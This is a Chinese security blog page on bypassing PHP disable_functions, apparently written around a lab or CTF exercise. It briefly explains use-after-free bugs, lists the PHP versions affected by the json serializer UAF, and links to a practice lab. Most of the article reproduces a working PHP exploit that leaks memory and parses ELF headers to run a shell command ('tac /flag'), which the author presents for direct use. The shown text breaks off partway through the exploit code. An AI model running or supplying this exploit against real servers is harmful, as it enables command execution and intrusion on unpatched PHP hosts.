<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>突破disable_functions执行命令·下 | Ulysses'Blog</title><meta name="keywords" content="bypass disable_functions"><meta name="author" content="Ulysses"><meta name="copyright" content="Ulysses"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="利用UAF漏洞UAF漏洞（Use-After-Free）是一种内存破坏漏洞，漏洞成因是一块堆内存被释放了之后又被使用。又被使用指的是：指针存在（悬垂指针被引用）。这个引用的结果是不可预测的，因为不知道会发生什么。由于大多数的堆内存其实都是C++对象，所以利用的核心思路就是分配堆去占坑，占的坑中有自己构造的虚表。 悬垂指针：悬垂指针是指一类不指向任何合法的或者有效的（即与指针的含义不符）的对象的指针">
<meta property="og:type" content="article">
<meta property="og:title" content="突破disable_functions执行命令·下">
<meta property="og:url" content="https://plumeria.ltd/post/9916b941.html">
<meta property="og:site_name" content="Ulysses&#39;Blog">
<meta property="og:description" content="利用UAF漏洞UAF漏洞（Use-After-Free）是一种内存破坏漏洞，漏洞成因是一块堆内存被释放了之后又被使用。又被使用指的是：指针存在（悬垂指针被引用）。这个引用的结果是不可预测的，因为不知道会发生什么。由于大多数的堆内存其实都是C++对象，所以利用的核心思路就是分配堆去占坑，占的坑中有自己构造的虚表。 悬垂指针：悬垂指针是指一类不指向任何合法的或者有效的（即与指针的含义不符）的对象的指针">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://plumeria.ltd/img/cover/disable_functions.png">
<meta property="article:published_time" content="2022-01-12T12:00:00.000Z">
<meta property="article:modified_time" content="2022-01-13T05:36:56.016Z">
<meta property="article:author" content="Ulysses">
<meta property="article:tag" content="bypass disable_functions">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://plumeria.ltd/img/cover/disable_functions.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://plumeria.ltd/post/9916b941"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.js" defer></script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: {"appId":"0HPLBDYHPG","apiKey":"0c8875d1d08e28840a882f41ae37ed2e","indexName":"my blog","hits":{"per_page":6},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '突破disable_functions执行命令·下',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-01-13 13:36:56'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    document.addEventListener('pjax:complete', detectApple)})(window)</script><link rel="stylesheet" href="/css/mycss.css"><style type="text/css">.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body{left:-66px!important}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover{left:0!important}</style><div class="aplayer" data-id="6997392079" data-server="netease" data-type="playlist" data-fixed="true" data-listFolded="false" data-order="random" data-preload="none"></div><link rel="stylesheet" href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css"><script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.1.6/css/swiper.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiperstyle.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/tag_plugins.min.css" media="defer" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/hexo-butterfly-tag-plugins-plus@latest/lib/carousel-touch.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/mindmap.min.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/gif/loading4.gif" data-original="https://avatars.githubusercontent.com/u/63300491?v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏机</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cover/disable_functions.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ulysses'Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏机</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">突破disable_functions执行命令·下</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-12T12:00:00.000Z" title="发表于 2022-01-12 20:00:00">2022-01-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-13T05:36:56.016Z" title="更新于 2022-01-13 13:36:56">2022-01-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/">Web安全攻防</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">代码执行与命令执行</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">13.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>71分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="突破disable_functions执行命令·下"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="利用UAF漏洞"><a href="#利用UAF漏洞" class="headerlink" title="利用UAF漏洞"></a>利用UAF漏洞</h2><p>UAF漏洞（Use-After-Free）是一种内存破坏漏洞，漏洞成因是一块堆内存被释放了之后又被使用。又被使用指的是：指针存在（悬垂指针被引用）。这个引用的结果是不可预测的，因为不知道会发生什么。由于大多数的堆内存其实都是C++对象，所以利用的核心思路就是分配堆去占坑，占的坑中有自己构造的虚表。</p>
<p>悬垂指针：悬垂指针是指一类不指向任何合法的或者有效的（即与指针的含义不符）的对象的指针。比如一个对象的指针，如果这个对象已经被释放或者回收但是指针没有进行任何的修改仍然执行已被释放的内存，这个指针就叫做悬垂指针。</p>
<blockquote>
<p>由于本人对PWN这块并不了解，对这些漏洞只是一知半解，所以也仅仅讲如何使用大佬的EXP直接利用了</p>
</blockquote>
<h3 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a>Json Serializer UAF</h3><p><strong>漏洞简介</strong>：</p>
<p>此漏洞利用json序列化程序中的释放后使用漏洞，利用json序列化程序中的堆溢出触发，以绕过disable_functions和执行系统命令。尽管不能保证成功，但它应该相当可靠的在所有服务器 api上使用。</p>
<p>漏洞细节：<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=72530">https://bugs.php.net/bug.php?id=72530</a></p>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li>Linux 操作系统</li>
<li>PHP 版本<ul>
<li>7.1 - all versions to date</li>
<li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li>
<li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li>
</ul>
</li>
</ul>
<p><strong>靶场环境</strong>：</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/6">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/6</a></p>
<p><strong>靶场突破</strong>：</p>
<p>除了蚁剑的扩展插件，还可以使用国外大佬<em>mm0r1</em>写的EXP：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;tac /flag&quot;</span>;		<span class="comment">// 可替换成需要执行的命令</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySplFixedArray</span> <span class="keyword">extends</span> <span class="title">SplFixedArray</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Z</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">      <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = chr(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= chr(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unable to leak ro segments</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak1</span>(<span class="params"><span class="variable">$addr</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$spl1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">8</span>, <span class="variable">$addr</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">return</span> strlen(get_class(<span class="variable">$spl1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the real deal</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak2</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$spl1</span>, <span class="variable">$fake_tbl_off</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake reference zval</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x10</span>, <span class="number">0xdeadbeef</span>); <span class="comment"># gc_refcounted</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x18</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x20</span>, <span class="number">6</span>); <span class="comment"># type (string)</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$leak</span> = strlen(<span class="variable">$spl1</span>::<span class="variable">$leak</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span 